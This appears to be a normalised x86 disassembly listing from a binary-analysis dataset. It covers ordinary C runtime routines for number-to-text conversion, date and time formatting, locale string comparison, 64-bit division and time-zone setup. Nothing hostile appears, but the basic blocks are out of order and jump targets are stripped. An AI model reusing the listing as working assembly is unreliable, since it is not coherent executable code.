cmp ebx [ ebp + 0x8 ]
jb r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] dl
inc ecx
inc ebx
test eax eax
je r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ esi ] 0x0
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_1007db79
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
xor ecx ecx
push esi
cmp edi ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
call sub_1004fd6f
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ecx
mov [ edi ] cl
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_1004fd6f
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov esi edi
cmp [ ebp + 0x18 ] ecx
je r-xdata
pop esi
mov [ eax ] esi
mov [ ebp + 0x18 ] esi
mov [ ebp + 0xc ] ecx
neg ebx
adc eax ecx
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add cl 0x30
add cl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test ebx ebx
je r-xdata
mov [ esi ] cl
mov ecx [ ebp - 0x4 ]
inc esi
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push eax
push ebx
call sub_1007c490
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov eax edx
cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
pop ebx
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov [ edi ] 0x0
call sub_1004fd6f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
call sub_1001d849
mov eax esi
jmp r-xdata
sub_1007dc65
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_1007dcf3
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_1007dd93
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100014b7
push rw-data
call sub_1004711e
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_10050f50
leave
retn
sub_1007ddbf
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0xa
push 0x1f
lea eax [ ebp - 0x23 ]
push eax
push 0x0
push [ ebp + 0x8 ]
mov [ ebp - 0x24 ] 0x2e
call sub_1004157e
lea eax [ ebp - 0x24 ]
push eax
push 0x0
call sub_10027dd1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0x1c
call sub_10024145
leave
retn
sub_1007de03
push ebx
push esi
push edi
mov ebx rw-data
add ebx 0x4
cmp ebx rw-data
jl r-xdata
push [ esi + 0x8 ]
mov edi [ esi ]
call sub_10037b81
push esi
call sub_10022b5a
pop ecx
pop ecx
mov esi edi
test edi edi
jne r-xdata
push 0x0
push ebx
call [ InterlockedExchange@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_1007de5a
cmp [ eax ] 0x0
push esi
mov esi edx
je r-xdata
pop esi
retn
push edi
pop edi
mov edi [ ecx ]
mov [ edi ] dl
inc [ ecx ]
inc esi
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
mov dl [ esi ]
test dl dl
je r-xdata
sub_1007de7a
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0x8 ] edx
je r-xdata
cmp esi [ ecx ]
jae r-xdata
cmp [ ecx ] 0x1
mov esi [ edi ]
jbe r-xdata
mov [ ecx ] edx
dec esi
lea edx [ esi + 0x1 ]
test edx edx
je r-xdata
mov eax [ edi ]
mov [ edi ] esi
dec esi
push 0xa
cdq
pop ebx
idiv ebx
add dl 0x30
mov [ esi ] dl
inc esi
dec [ ecx ]
mov edx [ ecx ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
add [ edi ] eax
sub [ ecx ] eax
jmp r-xdata
push 0xa
cdq
pop ebx
idiv ebx
mov ebx [ edi ]
add dl 0x30
inc [ ebp - 0x4 ]
mov [ esi + ebx ] dl
dec esi
cmp esi 0xffffffff
jne r-xdata
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
cmp eax esi
jb r-xdata
jmp r-xdata
cmp edx 0x1
ja r-xdata
pop esi
pop ebx
leave
retn
sub_1007def5
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
movsx eax al
push esi
mov esi [ ebp + 0xc ]
push edi
mov ebx ecx
mov edi edx
cmp eax 0x59
jg r-xdata
cmp eax 0x6d
jg r-xdata
je r-xdata
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0xfffff894
jl r-xdata
cmp eax 0x49
jg r-xdata
mov esi [ esi + 0x8 ]
test esi esi
js r-xdata
sub eax 0x7
je r-xdata
mov esi [ esi + 0x10 ]
test esi esi
js r-xdata
sub eax 0x5a
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp eax 0x1fa3
jg r-xdata
sub eax 0x4d
je r-xdata
je r-xdata
cmp esi 0x17
jg r-xdata
mov eax [ esi + 0x18 ]
test eax eax
js r-xdata
dec eax
je r-xdata
cmp esi 0xb
jg r-xdata
call sub_1002ccbf
call sub_1001e51f
mov edx eax
xor eax eax
cmp [ esi + 0x20 ] eax
setne al
mov [ ebp - 0x4 ] eax
mov eax ebx
mov ebx [ ebp - 0x4 ]
mov edx [ edx + ebx * 4 ]
jmp r-xdata
sub eax 0x7
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cdq
push 0x64
pop ecx
idiv ecx
push [ ebp + 0x14 ]
mov ecx ebx
push 0x4
add eax 0x13
imul eax eax 0x64
add eax edx
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
js r-xdata
push 0x6
pop ecx
sub eax ecx
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
js r-xdata
sub eax 0x4
je r-xdata
mov edx [ ebp + 0x10 ]
cmp esi 0xb
jg r-xdata
cmp eax 0x6
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
push [ ebp + 0x10 ]
push ebx
push edi
push esi
je r-xdata
dec eax
je r-xdata
lea eax [ esi + 0x1 ]
jmp r-xdata
mov ecx edi
call sub_1007de5a
mov esi [ esi + 0x18 ]
test esi esi
js r-xdata
dec eax
je r-xdata
pop edx
cmp eax 0x3b
jmp r-xdata
mov eax [ esi ]
test eax eax
js r-xdata
dec eax
dec eax
je r-xdata
cmp esi 0x17
jg r-xdata
xor eax eax
inc eax
sub eax 0x9
je r-xdata
mov edx [ edx + 0x9c ]
mov edx [ edx + 0x98 ]
jmp r-xdata
push [ ebp + 0x14 ]
xor edx edx
inc edx
jmp r-xdata
push 0x0
jmp r-xdata
push 0x1
jmp r-xdata
mov eax [ esi + 0x14 ]
test eax eax
js r-xdata
dec eax
jne r-xdata
push [ ebp + 0x14 ]
cmp esi 0x6
jle r-xdata
mov esi [ esi + 0x10 ]
test esi esi
js r-xdata
dec eax
je r-xdata
jg r-xdata
cmp eax 0x3b
jg r-xdata
mov eax [ esi + 0x18 ]
test eax eax
js r-xdata
dec eax
dec eax
je r-xdata
mov eax esi
cdq
push 0xc
pop ecx
idiv ecx
mov eax edx
test eax eax
jne r-xdata
sub eax 0x18
je r-xdata
mov eax ebx
call sub_1007de7a
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1007e2ad
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
cdq
push 0x64
pop ecx
idiv ecx
mov ecx ebx
mov eax edx
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
push [ ebp + 0x10 ]
push ebx
push edi
push esi
je r-xdata
dec eax
je r-xdata
jmp r-xdata
jmp r-xdata
cmp eax ecx
jg r-xdata
mov eax [ esi + 0x18 ]
test eax eax
js r-xdata
dec eax
jne r-xdata
mov ecx ebx
jmp r-xdata
push ecx
pop eax
mov eax [ edi ]
mov [ eax ] 0x25
inc [ edi ]
dec [ ebx ]
jmp r-xdata
sub eax 0x1c
je r-xdata
jmp r-xdata
push 0x2
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x38 ]
jmp r-xdata
push 0x0
jmp r-xdata
push 0x1
mov esi [ esi + 0xc ]
cmp esi 0x1
jl r-xdata
sub eax 0x6
jne r-xdata
mov ecx eax
cmp eax ecx
jg r-xdata
jmp r-xdata
mov esi [ esi + 0x18 ]
test esi esi
js r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call sub_1007e2ad
add esp 0x18
test eax eax
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp esi 0x1f
jg r-xdata
mov esi [ esi + 0x1c ]
test esi esi
js r-xdata
cmp eax 0x16d
jg r-xdata
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push ebx
push edi
push esi
push 0x2
cmp esi 0x6
jg r-xdata
mov esi [ esi + 0x10 ]
test esi esi
js r-xdata
sub eax 0x6
jne r-xdata
mov eax [ edi ]
mov [ eax ] 0x20
inc [ edi ]
dec [ ebx ]
mov eax esi
cmp esi 0x16d
jg r-xdata
cmp eax ecx
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
js r-xdata
lea ecx [ eax - 0x1 ]
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x1c ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
mov eax [ esi + 0x8 ]
test eax eax
js r-xdata
push [ ebp + 0x14 ]
lea eax [ esi + 0x1 ]
push 0x3
jmp r-xdata
push 0x7
cdq
pop esi
idiv esi
cmp edx ecx
jl r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x68 ]
jmp r-xdata
cmp eax 0x17
inc eax
jmp r-xdata
sub_1007e2ad
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
sub ecx 0x0
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x1c ]
push edi
mov [ ebp - 0x24 ] eax
je r-xdata
mov edi [ eax + 0xa0 ]
dec ecx
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebp + 0xc ] 0x2
mov eax [ GetDateFormatA@IAT ]
jne r-xdata
mov edi [ eax + 0xa4 ]
jmp r-xdata
mov edi [ eax + 0xa8 ]
jmp r-xdata
xor edx edx
cmp [ ebx ] edx
je r-xdata
jmp r-xdata
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x28 ]
mov ecx 0x76c
add cx [ eax + 0x14 ]
mov [ ebp - 0x14 ] cx
mov cx [ eax + 0x10 ]
inc cx
mov [ ebp - 0x12 ] cx
mov cx [ eax + 0xc ]
mov [ ebp - 0xe ] cx
mov cx [ eax + 0x8 ]
mov [ ebp - 0xc ] cx
mov cx [ eax + 0x4 ]
mov ax [ eax ]
mov [ ebp - 0x8 ] ax
xor eax eax
push eax
push eax
push edi
mov [ ebp - 0xa ] cx
lea ecx [ ebp - 0x14 ]
push ecx
push eax
mov [ ebp - 0x6 ] ax
mov eax [ ebp - 0x24 ]
push [ eax + 0xac ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
test eax eax
je r-xdata
mov eax [ GetTimeFormatA@IAT ]
cmp [ eax + 0xb0 ] 0x1
je r-xdata
xor eax eax
inc eax
mov [ ebp - 0x18 ] edx
mov ecx edi
add eax 0x8
cmp eax 0x400
jg r-xdata
inc ecx
inc edx
cmp [ ecx ] al
je r-xdata
mov [ ebp - 0x1c ] ecx
movsx ecx al
cmp ecx 0x64
jg r-xdata
push eax
call sub_1004ac7a
pop ecx
test eax eax
je r-xdata
call sub_1007d0c0
mov eax esp
test eax eax
je r-xdata
mov eax ecx
sub eax 0x68
je r-xdata
je r-xdata
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x5
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x27
je r-xdata
push [ ebp - 0x30 ]
mov [ ebp - 0x1c ] eax
push eax
push edi
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x24 ]
push 0x0
push [ eax + 0xac ]
call [ ebp - 0x2c ]
dec eax
test eax eax
jle r-xdata
add eax 0x8
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x6
je r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
add edi edx
test dl 0x1
je r-xdata
cmp ecx 0x41
je r-xdata
push [ ebp - 0x18 ]
call sub_1003b313
pop ecx
mov edi [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
mov edi [ ebp - 0x1c ]
jmp r-xdata
mov al 0x49
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
dec eax
je r-xdata
push [ ebp - 0x18 ]
mov ecx ebx
push [ ebp - 0x24 ]
mov edx esi
push [ ebp - 0x28 ]
push [ ebp - 0x20 ]
call sub_1007def5
add esp 0x10
test eax eax
je r-xdata
mov al 0x64
jmp r-xdata
dec eax
je r-xdata
mov al [ edi ]
test al al
je r-xdata
push r--data
push edi
call sub_1004d631
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x48
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
dec eax
test eax eax
jg r-xdata
lea esp [ ebp - 0x3c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
leave
retn
push [ ebp - 0x20 ]
push ecx
call sub_10055531
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x4d
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x8 ] 0xb
mov eax [ ebp - 0x24 ]
jg r-xdata
sub eax 0x5
jne r-xdata
mov al 0x61
jmp r-xdata
dec eax
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
push r--data
push edi
call sub_1004d631
pop ecx
pop ecx
test eax eax
jne r-xdata
add edi 0x5
jmp r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x4d
je r-xdata
cmp [ ebx ] 0x0
jbe r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x53
jmp r-xdata
jmp r-xdata
mov edi [ eax + 0x9c ]
mov edi [ eax + 0x98 ]
jmp r-xdata
lea eax [ edx - 0x1 ]
dec eax
je r-xdata
mov al 0x41
jmp r-xdata
cmp al 0x27
je r-xdata
mov al 0x70
jmp r-xdata
add edi 0x3
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x61
je r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x0
jbe r-xdata
cmp edx 0x1
jne r-xdata
mov al 0x79
jmp r-xdata
dec eax
dec eax
jne r-xdata
inc edi
jmp r-xdata
push [ ebp - 0x20 ]
movsx eax al
push eax
call sub_10055531
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x48
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x0
jbe r-xdata
jmp r-xdata
movsx eax [ edi ]
push [ ebp - 0x20 ]
push eax
call sub_10055531
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x59
jmp r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x6d
jmp r-xdata
dec eax
je r-xdata
push [ ebp - 0x20 ]
movsx eax al
push eax
call sub_10055531
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
dec [ ebx ]
jmp r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov al 0x62
jmp r-xdata
dec eax
jne r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
mov al 0x42
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
sub_1007e710
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_1007e778
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx ecx
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
test edi edi
jle r-xdata
cmp edi 0xffffffff
jge r-xdata
mov ecx edi
mov esi [ ebp + 0x18 ]
test esi esi
jle r-xdata
xor eax eax
jmp r-xdata
or eax 0xffffffff
sub eax ecx
add edi eax
mov [ ebp + 0x14 ] edi
inc eax
test ecx ecx
jne r-xdata
cmp esi 0xffffffff
jl r-xdata
mov ecx esi
mov eax edx
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
leave
retn
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
and [ ebp - 0x28 ] 0x0
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
or eax 0xffffffff
sub eax ecx
add esi eax
mov [ ebp + 0x18 ] esi
jmp r-xdata
inc eax
test ecx ecx
jne r-xdata
test edi edi
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
cmp edi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
inc ebx
cmp esi ebx
jle r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push 0x0
push 0x0
push edi
push [ ebp - 0x24 ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
cmp edi ebx
jle r-xdata
mov eax ebx
jmp r-xdata
mov edi 0x400
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x1c ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
test edi edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x1c ]
push [ ebp + 0x14 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
test esi esi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x1c ]
call sub_1003b313
mov eax [ ebp - 0x28 ]
pop ecx
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x20 ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_1004ac7a
pop ecx
test eax eax
je r-xdata
call sub_1007d0c0
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x20 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x20 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_1003b313
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x1c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_1004ac7a
pop ecx
test eax eax
je r-xdata
call sub_1007d0c0
mov eax esp
test eax eax
je r-xdata
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
add eax 0x8
sub_1007e9e6
push 0x2c
push r--data
call sub_10079bf0
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_10043f7b
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_1001e51f
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_1005213d
pop ecx
cmp eax ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100492ed
lea eax [ ebp - 0x24 ]
push eax
call sub_1001fda5
pop ecx
cmp eax ebx
jne r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov [ rw-data ] ebx
lea eax [ ebp - 0x28 ]
push eax
call sub_100060d5
pop ecx
cmp eax ebx
jne r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
mov eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] bx
je r-xdata
call sub_1005150b
mov [ ebp - 0x34 ] eax
mov [ rw-data ] ebx
or edi 0xffffffff
mov [ rw-data ] edi
mov [ rw-data ] edi
push r--data
call sub_10052d6e
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
call sub_10079c35
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_100317fa
add esp 0x10
test eax eax
jne r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push esi
call sub_1000eda6
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
push esi
call sub_10079b60
inc eax
push eax
call sub_10008102
pop ecx
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_10079ce0
pop ecx
pop ecx
test eax eax
je r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rw-data
push ebx
push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
push esi
push esi
call sub_10079b60
pop ecx
inc eax
push eax
push [ rw-data ]
call sub_1006605f
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
